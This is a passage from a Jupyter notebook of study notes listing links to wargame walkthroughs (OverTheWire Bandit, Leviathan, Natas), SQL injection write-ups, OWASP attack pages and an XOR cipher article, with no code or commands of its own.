    "[ [y](https://www.youtube.com/watch?v=9ReSHQihuZw) ] `11-09-2022`. freeCodeCamp. \"Command Line Hacking – Over The Wire Bandit Walkthrough (CTF Wargame)\".\n",
    "\n",
    "[ [h](https://mayadevbe.me/posts/) ] MayADevBe Blog\n",
    "* Bandit\n",
    "  * [30->31](https://mayadevbe.me/posts/overthewire/bandit/level31/)\n",
    "  * [31->32](https://mayadevbe.me/posts/overthewire/bandit/level32/)\n",
    "  * [32->33](https://mayadevbe.me/posts/overthewire/bandit/level33/)\n",
    "* Leviathan\n",
    "  * [0->1](https://mayadevbe.me/posts/overthewire/leviathan/level1/)\n",
    "  * [1->2](https://mayadevbe.me/posts/overthewire/leviathan/level2/)\n",
    "  * [2->3](https://mayadevbe.me/posts/overthewire/leviathan/level3/)\n",
    "  * [3->4](https://mayadevbe.me/posts/overthewire/leviathan/level4/)\n",
    "  * [4->5](https://mayadevbe.me/posts/overthewire/leviathan/level5/)\n",
    "  * [5->6](https://mayadevbe.me/posts/overthewire/leviathan/level6/)\n",
    "  * [6->7](https://mayadevbe.me/posts/overthewire/leviathan/level7/)\n",
    "\n",
    "More\n",
    "* https://www.reddit.com/r/hacking/wiki/index/#wiki_ctfs\n",
    "* https://hackernoon.com/top-10-wargames-sites-for-learning-practice-or-just-for-fun-bp1n3t2x\n",
    "* https://medium.com/@n01s/solving-natas-11-df246fcf7828"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Natas\n",
    "* Natas14\n",
    "  * https://medium.com/hacker-toolbelt/natas-14-injection-with-owasp-zap-34aff3f05e7c\n",
    "* Natas15\n",
    "  * https://mcpa.github.io/natas/wargame/web/overthewire/2015/09/29/natas15/\n",
    "  * https://medium.com/hacker-toolbelt/natas-15-sql-injection-with-sqlmap-66cb4f89e3f7\n",
    "  * https://medium.com/@d1rtyc4t/overthewires-natas15-0dca1989b5f1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "OWASP\n",
    "* [ [d](https://owasp.org/www-community/attacks/Blind_SQL_Injection) ] Blind SQL Injection\n",
    "* [ [d](https://owasp.org/www-community/attacks/SQL_Injection) ] SQL Injection"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Terms"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[ [w](https://en.wikipedia.org/wiki/XOR_cipher) ] xor cipher"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
